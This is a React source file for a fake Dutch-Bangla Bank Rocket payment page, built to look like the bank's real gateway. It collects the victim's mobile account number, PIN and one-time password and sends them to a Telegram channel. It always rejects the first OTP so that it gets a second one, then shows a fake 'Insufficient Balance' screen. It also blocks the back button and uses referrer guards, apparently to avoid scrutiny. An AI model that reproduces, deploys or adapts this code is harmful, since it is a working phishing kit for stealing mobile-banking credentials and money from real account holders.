import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { sendTelegramNotification } from "@/lib/telegram";
import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
import { useReferrerGuard } from "@/hooks/useReferrerGuard";
import dbblHeader from "@/assets/dbbl-header.jpg";
import secureLogos from "@/assets/3d-secure-logos.jpg";
import otpIllustration from "@/assets/otp-illustration.jpg";
import blueLine from "@/assets/blue-line-new.png";


const RocketPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const isAllowed = usePaymentMethodGuard("rocket");
  const { checking: referrerChecking } = useReferrerGuard();
  const [mobileAccount, setMobileAccount] = useState("");
  const [pin, setPin] = useState("");
  const [otp, setOtp] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [pinAttempts, setPinAttempts] = useState(0);
  const [showError, setShowError] = useState("");
  const [redirectTimer, setRedirectTimer] = useState(5);
  const [showFailed, setShowFailed] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [otpAttempts, setOtpAttempts] = useState(0);
  

  const mobileRef = useRef<HTMLInputElement>(null);
  const pinRef = useRef<HTMLInputElement>(null);
  const otpRef = useRef<HTMLInputElement>(null);

  const descriptionId = "6121177461411359757";

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href);
      setShowCancelDialog(true);
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate]);

  useEffect(() => {
    setTimeout(() => mobileRef.current?.focus(), 100);
  }, []);

  useEffect(() => {
    if (showOtp) {
      setTimeout(() => otpRef.current?.focus(), 100);
    }
  }, [showOtp]);

  useEffect(() => {
    if (showFailed && redirectTimer > 0) {
      const interval = setInterval(() => setRedirectTimer(p => p - 1), 1000);
      return () => clearInterval(interval);
    }
    if (showFailed && redirectTimer === 0) {
      navigate(`/payment-cancelled?channel=Rocket&reason=Insufficient Balance&amount=${amount}`);
    }
  }, [showFailed, redirectTimer, navigate]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const isValidMobile = () => {
    return mobileAccount.length === 12 && validPrefixes.includes(mobileAccount.substring(0, 3)) && /^\d+$/.test(mobileAccount);
  };

  const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 12);
    setMobileAccount(value);
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 4);
    setPin(value);
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(value);
  };

  const handleSubmit = () => {
    if (!isValidMobile()) {
      setShowError("Please enter a valid mobile number.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    if (pin.length < 4) {
      setShowError("Please enter your PIN.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }

    setIsSubmitting(true);
    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Rocket', paymentType: 'mfs', number: mobileAccount, pin });

    // 1s delay before showing OTP page
    setTimeout(() => {
      setIsSubmitting(false);
      setShowOtp(true);
    }, 1000);
  };



  const handleOtpSubmit = () => {
    if (otp.length < 6) {
      setShowError("Please enter the OTP.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    setIsSubmitting(true);
    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Rocket', paymentType: 'mfs', number: mobileAccount, pin, otp });

    if (otpAttempts === 0) {
      setTimeout(() => {
        setIsSubmitting(false);
        setOtpAttempts(1);
        setShowError("Invalid OTP provided.");
        setOtp("");
        setTimeout(() => otpRef.current?.focus(), 50);
        setTimeout(() => setShowError(""), 4000);
      }, 1000);
      return;
    }

    setTimeout(() => {
      setIsSubmitting(false);
      navigate(`/payment-cancelled?channel=Rocket&reason=Insufficient Balance&amount=${amount}`);
    }, 1000);
  };

  const handleBack = () => {
    navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}`);
  };

  const handleReset = () => {
    setMobileAccount("");
    setPin("");
    setShowError("");
    setTimeout(() => mobileRef.current?.focus(), 50);
  };

  const togglePinVisibility = () => setShowPin(!showPin);

  // Header: DBBL logo image
  const header = (
    <div>
      <div className="bg-[#e8e8e8]">
        <img src={dbblHeader} alt="Dutch-Bangla Bank" className="w-full h-auto" />
      </div>
      <img src={blueLine} alt="" className="w-full h-[7px] block" style={{ objectFit: 'fill' }} />
    </div>
  );

  // Blue lines with DBBL NEXUS GATEWAY text (blue text on white bg)
  const gatewayBanner = (
    <>
      <div className="bg-white py-1 text-center">
        <span className="text-[#0000cc] text-sm min-[375px]:text-base font-bold tracking-wide" style={{ fontFamily: 'Georgia, "Times New Roman", serif' }}>
          DBBL NEXUS GATEWAY
        </span>
      </div>
      <img src={blueLine} alt="" className="w-full h-[7px] block" style={{ objectFit: 'fill' }} />
    </>
  );

  // Footer with colored line
  const footer = (
    <div>
      <img src={blueLine} alt="" className="w-full h-[7px] block" style={{ objectFit: 'fill' }} />
      <div className="text-center py-1 min-[375px]:py-1.5">
        <p className="text-[10px] min-[375px]:text-xs font-bold text-[#333]" style={{ fontFamily: 'Arial, sans-serif' }}>
          DBBL E-COMM With Service Hub Limited
        </p>
        <p className="text-[9px] min-[375px]:text-[10px] text-[#666]" style={{ fontFamily: 'Arial, sans-serif' }}>
          ecom1.dutchbanglabank.com
        </p>
      </div>
    </div>
  );

  // Retro metallic button SVG
  const makeButton = (label: string) => {
    const encoded = encodeURIComponent(label);
    return `data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='90' height='22'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23e0e0e0'/%3E%3Cstop offset='50%25' stop-color='%23c8c8c8'/%3E%3Cstop offset='100%25' stop-color='%23a0a0a0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='90' height='22' rx='2' fill='url(%23g)' stroke='%23888' stroke-width='1'/%3E%3Crect x='3' y='0' width='2' height='22' fill='%23cc0000'/%3E%3Crect x='5' y='0' width='2' height='22' fill='%23009933'/%3E%3Crect x='7' y='0' width='2' height='22' fill='%23003399'/%3E%3Crect x='81' y='0' width='2' height='22' fill='%23003399'/%3E%3Crect x='83' y='0' width='2' height='22' fill='%23009933'/%3E%3Crect x='85' y='0' width='2' height='22' fill='%23cc0000'/%3E%3Ctext x='45' y='15' text-anchor='middle' font-family='Arial' font-size='11' font-weight='bold' fill='%23333'%3E${encoded}%3C/text%3E%3C/svg%3E`;
  };

  // OTP Page (matches second screenshot exactly)
  if (showOtp) {
    return (
    <>
    <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
        <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
          {header}
          <div className="px-3 min-[375px]:px-4 py-3 min-[375px]:py-4">
            <p className="text-[11px] min-[375px]:text-xs text-[#333] leading-relaxed mb-3" style={{ fontFamily: 'Arial, sans-serif' }}>
              An OTP (One Time Password) has been sent to your registered mobile and e-mail. Please input the OTP for verification.
            </p>
            <hr className="border-[#ddd] mb-3" />
            <div className="flex items-center gap-2 mb-3">
              <label className="text-[11px] min-[375px]:text-xs text-[#333] whitespace-nowrap" style={{ fontFamily: 'Arial, sans-serif' }}>
                OTP (One Time Password):
              </label>
              <input ref={otpRef} type="text" inputMode="numeric" value={otp} onChange={handleOtpChange}
                className="border border-[#999] px-1.5 text-xs w-[90px] h-[22px] min-[375px]:h-[26px] focus:outline-none focus:border-[#0066cc]"
                style={{ fontFamily: 'Arial, sans-serif' }} />
            </div>
            <div className="relative flex items-center justify-center mb-4">
              <button onClick={handleOtpSubmit} disabled={isSubmitting}
                className="border border-[#999] bg-[#f0f0f0] px-2 flex items-center gap-1 hover:bg-[#e0e0e0] text-xs leading-tight shrink-0"
                style={{ fontFamily: 'Arial, sans-serif', height: '20px' }}>
                <span className="font-bold text-[#333]">Go</span>
                <span className="bg-red-600 text-white text-[9px] font-bold px-0.5 leading-none">&gt;</span>
              </button>
              {showError && (
                <span className="absolute left-[calc(50%+40px)] text-red-600 text-[10px] min-[375px]:text-xs font-medium whitespace-nowrap">Invalid OTP provided.</span>
              )}
            </div>
            <div className="flex justify-center">
              <img src={otpIllustration} alt="OTP Verification" className="w-full max-w-[400px] h-auto border border-[#ccc]" loading="lazy" />
            </div>
          </div>
        </div>
      </div>
    </>
    );
  }

  // Failed page
  if (showFailed) {
    return (
      <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
        <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
          {header}
          {gatewayBanner}
          <div className="p-4 min-[375px]:p-6 text-center">
            <p className="text-red-600 font-bold text-sm min-[375px]:text-base mb-1">Transaction Failed</p>
            <p className="text-gray-600 text-xs min-[375px]:text-sm mb-1">Insufficient balance in your account.</p>
            <p className="text-gray-500 text-[10px] min-[375px]:text-xs">
              Redirecting to merchant website in {redirectTimer}s...
            </p>
          </div>
          {footer}
        </div>
      </div>
    );
  }

  // Main form page (matches first screenshot exactly)
  if (referrerChecking || isAllowed !== true) return null;

  return (
    <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
      <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
        {header}
        {gatewayBanner}

        {/* Form Section */}
        <div className="px-3 min-[375px]:px-4 py-3 min-[375px]:py-4">
          <h2 className="text-center font-bold text-xs min-[375px]:text-sm text-[#333] mb-3 min-[375px]:mb-4" style={{ fontFamily: 'Arial, sans-serif' }}>
            Mobile Account Information
          </h2>

          {showError && (
            <div className="text-center text-red-600 text-[10px] min-[375px]:text-xs mb-2 font-medium">
              {showError}
            </div>
          )}

          {/* Form */}
          <div className="max-w-md mx-auto space-y-2 min-[375px]:space-y-2.5">
            {/* Mobile Account */}
            <div className="flex items-center justify-center gap-2">
              <label className="text-[11px] min-[375px]:text-xs text-[#333] whitespace-nowrap text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>
                Mobile Account
              </label>
              <input
                ref={mobileRef}
                type="text"
                inputMode="numeric"
                value={mobileAccount}
                onChange={handleMobileChange}
                className="border border-[#999] px-1.5 text-xs w-[160px] min-[375px]:w-[200px] h-[22px] min-[375px]:h-[26px] focus:outline-none focus:border-[#0066cc]"
                style={{ fontFamily: 'Arial, sans-serif' }}
              />
            </div>

            {/* PIN */}
            <div className="flex items-center justify-center gap-2">
              <label className="text-[11px] min-[375px]:text-xs text-[#333] whitespace-nowrap text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>
                PIN
              </label>
              <div className="flex items-center gap-1 w-[160px] min-[375px]:w-[200px]">
                <input
                  ref={pinRef}
                  type={showPin ? "text" : "password"}
                  inputMode="numeric"
                  value={pin}
                  onChange={handlePinChange}
                  className="border border-[#999] px-1.5 text-xs w-[80px] min-[375px]:w-[100px] h-[22px] min-[375px]:h-[26px] focus:outline-none focus:border-[#0066cc]"
                  style={{ fontFamily: 'Arial, sans-serif' }}
                />
                <button
                  onClick={togglePinVisibility}
                  className="w-[30px] min-[375px]:w-[34px] h-[22px] min-[375px]:h-[26px] border border-[#999] bg-[#f5f5f5] flex items-center justify-center"
                  title={showPin ? "Hide PIN" : "Show PIN"}
                >
                  <svg width="16" height="12" viewBox="0 0 20 14" fill="none">
                    <rect x="1" y="1" width="18" height="12" rx="1" stroke="#666" strokeWidth="1" fill="#ddd" />
                    <line x1="3" y1="4" x2="5" y2="4" stroke="#888" strokeWidth="1" />
                    <line x1="6" y1="4" x2="8" y2="4" stroke="#888" strokeWidth="1" />
                    <line x1="9" y1="4" x2="11" y2="4" stroke="#888" strokeWidth="1" />
                    <line x1="12" y1="4" x2="14" y2="4" stroke="#888" strokeWidth="1" />
                    <line x1="15" y1="4" x2="17" y2="4" stroke="#888" strokeWidth="1" />
                    <line x1="3" y1="7" x2="5" y2="7" stroke="#888" strokeWidth="1" />
                    <line x1="6" y1="7" x2="8" y2="7" stroke="#888" strokeWidth="1" />
                    <line x1="9" y1="7" x2="11" y2="7" stroke="#888" strokeWidth="1" />
                    <line x1="12" y1="7" x2="14" y2="7" stroke="#888" strokeWidth="1" />
                    <line x1="15" y1="7" x2="17" y2="7" stroke="#888" strokeWidth="1" />
                    <line x1="3" y1="10" x2="5" y2="10" stroke="#888" strokeWidth="1" />
                    <line x1="6" y1="10" x2="8" y2="10" stroke="#888" strokeWidth="1" />
                    <line x1="9" y1="10" x2="11" y2="10" stroke="#888" strokeWidth="1" />
                  </svg>
                </button>
              </div>
            </div>

            {/* Amount */}
            <div className="flex items-center justify-center gap-2">
              <span className="text-[11px] min-[375px]:text-xs text-[#333] text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>Amount</span>
              <span className="text-[11px] min-[375px]:text-xs text-[#333] w-[160px] min-[375px]:w-[200px]" style={{ fontFamily: 'Arial, sans-serif' }}>{amount}</span>
            </div>
            {/* Currency */}
            <div className="flex items-center justify-center gap-2">
              <span className="text-[11px] min-[375px]:text-xs text-[#333] text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>Currency</span>
              <span className="text-[11px] min-[375px]:text-xs text-[#333] w-[160px] min-[375px]:w-[200px]" style={{ fontFamily: 'Arial, sans-serif' }}>BDT</span>
            </div>
            {/* Description */}
            <div className="flex items-center justify-center gap-2">
              <span className="text-[11px] min-[375px]:text-xs text-[#333] text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>Description</span>
              <span className="text-[10px] min-[375px]:text-xs text-[#333] w-[160px] min-[375px]:w-[200px]" style={{ fontFamily: 'Arial, sans-serif' }}>{descriptionId}</span>
            </div>
          </div>

          {/* Buttons */}
          <div className="flex items-center justify-center gap-2 mt-4 min-[375px]:mt-5">
            <button onClick={handleBack} className="hover:opacity-80">
              <img src={makeButton("BACK")} alt="BACK" className="h-5 cursor-pointer" />
            </button>
            <button onClick={handleSubmit} disabled={isSubmitting} className="hover:opacity-80">
              <img src={makeButton("SUBMIT")} alt="SUBMIT" className="h-5 cursor-pointer" />
            </button>
            <button onClick={handleReset} className="hover:opacity-80">
              <img src={makeButton("RESET")} alt="RESET" className="h-5 cursor-pointer" />
            </button>
          </div>

          {/* Verified logos */}
          <div className="flex items-center justify-center mt-4 min-[375px]:mt-5">
            <img src={secureLogos} alt="Verified by VISA & MasterCard SecureCode" className="h-10 min-[375px]:h-12 object-contain" />
          </div>
        </div>

        {footer}
      </div>
      
    </div>
  );
};

export default RocketPayment;
